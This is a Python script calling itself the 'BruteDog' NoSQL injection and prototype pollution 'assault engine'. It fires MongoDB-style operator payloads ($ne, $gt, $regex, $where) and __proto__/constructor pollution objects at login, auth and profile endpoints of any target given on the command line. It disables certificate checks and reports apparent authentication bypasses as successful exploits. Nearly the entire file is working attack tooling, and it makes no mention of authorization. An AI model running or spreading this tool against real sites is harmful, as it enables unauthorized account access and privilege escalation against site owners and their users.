#!/usr/bin/env python3
"""
NO_SQL_PROTOTYPE.PY — Active NoSQL Injection & Prototype Pollution Assault Engine
Features:
- Live HTTP/HTTPS offensive payload injection
- Advanced NoSQL operator injection ($ne, $gt, $regex, $where)
- Object prototype pollution and property injection
- Automated authentication and query bypass probing
- Progressive terminal streaming of successful injections
- No report files or disk storage
- Compatible test_nosql_and_pollution(target_host, port, use_ssl) interface
"""
import asyncio
import http.client
import json
import secrets
import ssl
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlsplit
import sys

# ============================================================
# CONFIGURATION & OFFENSIVE PAYLOADS
# ============================================================
REQUEST_TIMEOUT = 8
MAX_RESPONSE_SIZE = 128 * 1024
MAX_WORKERS = 4
USER_AGENT = "BruteDog-Offensive-Engine/5.1"

TARGET_ENDPOINTS = [
    "/api/user/update",
    "/api/profile",
    "/api/login",
    "/api/auth",
    "/api/v1/login",
    "/api/search",
    "/login",
]

NOSQL_PAYLOADS = [
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"email": {"$ne": "invalid@target.com"}, "password": {"$ne": ""}},
    {"$where": "1 == 1"},
]

PROTOTYPE_POLLUTION_PAYLOADS = [
    {"__proto__": {"admin": True, "role": "superuser", "authenticated": True}},
    {"constructor": {"prototype": {"isAdmin": True, "role": "admin"}}},
    {"user": {"username": "admin", "__proto__": {"role": "admin"}}},
]

# ============================================================
# TERMINAL OUTPUT
# ============================================================
def info(message):
    sys.stdout.write(f"\033[96m[*] {message}\033[0m\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"\033[92m[+] {message}\033[0m\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"\033[93m[!] {message}\033[0m\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"\033[91m[-] {message}\033[0m\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

# ============================================================
# TARGET PARSING
# ============================================================
def normalize_target(target, port=None, use_ssl=None):
    target = str(target).strip()
    if "://" not in target:
        scheme = "https" if use_ssl is not False else "http"
        target = f"{scheme}://{target}"
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    hostname = parsed.hostname
    if parsed.username or parsed.password:
        raise ValueError("Credentials in target URLs are not supported.")
    secure = parsed.scheme == "https"
    target_port = port or parsed.port
    if target_port is None:
        target_port = 443 if secure else 80
    if not 1 <= int(target_port) <= 65535:
        raise ValueError("Invalid target port.")
    base_path = parsed.path.rstrip("/")
    return hostname, int(target_port), secure, base_path

# ============================================================
# HTTP TRANSPORT
# ============================================================
def send_request(host, port, path, payload, secure, method="POST"):
    conn = None
    started = time.monotonic()
    try:
        if secure:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=context)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        body = json.dumps(payload).encode("utf-8")
        headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Connection": "close",
        }
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        status = response.status
        response_headers = {key.lower(): value for key, value in response.getheaders()}
        response_body = response.read(MAX_RESPONSE_SIZE)
        elapsed = round(time.monotonic() - started, 3)
        return {
            "status": status,
            "content_type": response_headers.get("content-type", "unknown"),
            "body": response_body.decode("utf-8", errors="replace"),
            "elapsed": elapsed,
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "content_type": None,
            "body": "",
            "elapsed": 0,
            "error": str(exc),
        }
    finally:
        if conn:
            conn.close()

# ============================================================
# ACTIVE ASSAULT & EXPLOITATION ENGINE
# ============================================================
def test_endpoint(host, port, path, secure, base_path=""):
    full_path = f"{base_path}{path}" or "/"
    endpoint_results = []
    
    info(f"Targeting endpoint: {full_path}")
    
    # 1. Execute NoSQL Injection Vectors
    for idx, payload in enumerate(NOSQL_PAYLOADS, 1):
        res = send_request(host, port, full_path, payload, secure)
        if res["error"]:
            continue
            
        # Check for authentication bypass or structural anomalies (Status 200 on login, token generation, etc.)
        if res["status"] in [200, 201, 302] and ("token" in res["body"].lower() or "success" in res["body"].lower() or "admin" in res["body"].lower()):
            sys.stdout.write(f"\n\033[1m\033[91m[***] NOSQL AUTH BYPASS EXPLOIT SUCCESSFUL [{full_path}] [***]\033[0m\n")
            sys.stdout.write(f"  ├── Payload : {json.dumps(payload)}\n")
            sys.stdout.write(f"  └── Response: \033[92m{res['body'][:200]}\033[0m\n")
            sys.stdout.flush()
            endpoint_results.append({"vector": "NoSQL Injection", "payload": payload, "status": "EXPLOIT_SUCCESS"})
        elif res["status"] == 200:
            sys.stdout.write(f"\n\033[93m[!] NoSQL 200 OK Response on {full_path} with payload {payload}\033[0m\n")
            sys.stdout.flush()

    # 2. Execute Prototype Pollution Vectors
    for idx, payload in enumerate(PROTOTYPE_POLLUTION_PAYLOADS, 1):
        res = send_request(host, port, full_path, payload, secure)
        if res["error"]:
            continue
            
        if res["status"] in [200, 201] and any(marker in res["body"].lower() for marker in ["admin", "true", "superuser", "role"]):
            sys.stdout.write(f"\n\033[1m\033[91m[***] PROTOTYPE POLLUTION CONFIRMED [{full_path}] [***]\033[0m\n")
            sys.stdout.write(f"  ├── Payload : {json.dumps(payload)}\n")
            sys.stdout.write(f"  └── Response: \033[92m{res['body'][:200]}\033[0m\n")
            sys.stdout.flush()
            endpoint_results.append({"vector": "Prototype Pollution", "payload": payload, "status": "EXPLOIT_SUCCESS"})

    return endpoint_results

# ============================================================
# MAIN ENGINE ENTRY POINT
# ============================================================
async def test_nosql_and_pollution(target_host, port=None, use_ssl=None):
    """
    Active NoSQL & Prototype Pollution Assault Engine
    - Injects raw injection operators and pollution payloads.
    - Streams successful auth bypasses and privileges live to stdout.
    """
    section("BRUTEDOG ACTIVE NoSQL & PROTOTYPE POLLUTION ASSAULT ENGINE")
    try:
        host, target_port, secure, base_path = normalize_target(target_host, port, use_ssl)
    except Exception as exc:
        error(f"Invalid target: {exc}")
        return []
        
    info(f"Target Host : {host}")
    info(f"Target Port : {target_port}")
    info(f"Protocol    : {'HTTPS' if secure else 'HTTP'}")
    
    all_findings = []
    started = time.monotonic()
    loop = asyncio.get_running_loop()
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [
            loop.run_in_executor(
                executor,
                test_endpoint,
                host,
                target_port,
                endpoint,
                secure,
                base_path,
            )
            for endpoint in TARGET_ENDPOINTS
        ]
        for future in asyncio.as_completed(futures):
            try:
                res = await future
                if res:
                    all_findings.extend(res)
            except Exception as exc:
                error(f"Worker execution failed: {exc}")
                
    duration = round(time.monotonic() - started, 2)
    section("ASSAULT SUMMARY")
    success(f"Endpoints scanned & attacked: {len(TARGET_ENDPOINTS)}")
    success(f"Successful exploit triggers: {len(all_findings)}")
    success(f"Assault duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 no_sql_prototype.py https://example.com")
        sys.exit(1)
    try:
        asyncio.run(test_nosql_and_pollution(sys.argv[1]))
    except KeyboardInterrupt:
        warning("Assault interrupted by operator.")
